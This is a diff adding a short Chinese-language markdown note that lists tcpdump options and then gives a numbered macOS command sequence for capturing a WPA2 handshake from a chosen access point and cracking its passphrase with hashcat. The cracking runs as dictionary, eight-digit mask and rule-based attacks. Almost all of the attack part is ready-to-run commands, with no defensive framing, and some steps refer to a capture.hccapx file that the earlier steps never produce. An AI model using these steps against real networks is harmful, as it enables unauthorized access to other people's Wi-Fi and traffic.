@@ -1,0 +1,36 @@
+# Tcpdump
++ -c [count]
+	抓去指定数量的包
++ -i [interface]
+	指定要抓包的接口
++ -I 
+	设置为监听模式，只支持IEEE 802.11 Wi-Fi 接口，并且只支持一些操作系统
++ -w [file]
+	指定将抓包数据写入一个文件而不是打印出来
++ -U
+	指定缓存，如果设置了-w，那么抓包数据会立即写入文件，没有指定-w，数据会被缓存然后输出
++ -vvv
+	输出更多
+
+
+### Wifi Mac 帧
+<center><img src="pics/wifi-frame.jpg" width="60%"></center>
+
+软件安装：
++ brew install hashcat
++ brew install hcxtools
++ brew install wireshark
+
+1. export BSSID=ac:cb:51:af:98:19
+2. networksetup -listallhardwareports
+3. sudo airport -z
+4. sudo airport -c153
+5. sudo tcpdump "type mgt subtype beacon and ether src $BSSID" -I -c 1 -i en0 -w beacon.cap
+6. sudo tcpdump "ether proto 0x888e and ether host $BSSID" -I -U -vvv -i en0 -w handshake.cap
+7. mergecap -a -F pcap -w capture.cap beacon.cap handshake.cap
+8. hcxpcapngtool -o hashfile capture.cap
+9. hashcat -m 22000 capture.hccapx wpa2-wordlists/full.txt
+10. hashcat -m 22000 -a3 capture.hccapx "?d?d?d?d?d?d?d?d"
+11. hashcat -m 22000 hashfile wpa.txt -r Probable-Wordlists/Analysis-Files/ProbWL-547-rule-probable-v2.rule
+
+https://hashcat.net/cap2hashcat/
